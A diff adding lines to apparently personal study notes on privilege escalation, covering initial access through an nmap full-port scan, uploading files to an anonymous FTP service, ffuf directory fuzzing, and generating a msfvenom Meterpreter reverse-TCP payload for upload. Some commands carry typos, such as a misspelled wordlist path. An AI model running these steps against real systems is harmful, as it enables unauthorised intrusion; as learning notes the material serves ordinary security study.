@@ -12,8 +12,23 @@ Example - Login to website with someone's account
 
 2.Vertical priv escalation - When user able to perform any activity on behalf of administrator.
 
-I Gaining Initial Access 
+I) Gaining Initial Access 
 
 ->It basically requires some type of privilages in your hand.
+
 ->Once we have initial access we can then perform enumeration to identify vulnerabilities that can allow us to do privilage escalation.
 
+nmap -p- -A ipofdevice -oN nmap.txt --min-rate 10000
+
+If FTP anonumous service is allowed
+If no file found or not found anything , try to put some file from your system
+put nmap.txt
+
+Now if found port 80 
+just type ip on the browser 
+use ffuf => ffuf -u http://ip/FUZZ/nmap.txt -w /usr/share/seclists/Discovery/web-content/reft-small-directoriex.txt -t 100
+
+Now try uploading payload created by msfvenom
+
+msfvenom -l formats
+msfvenom -p windows/x64/meterpreter/reverse_tcp 
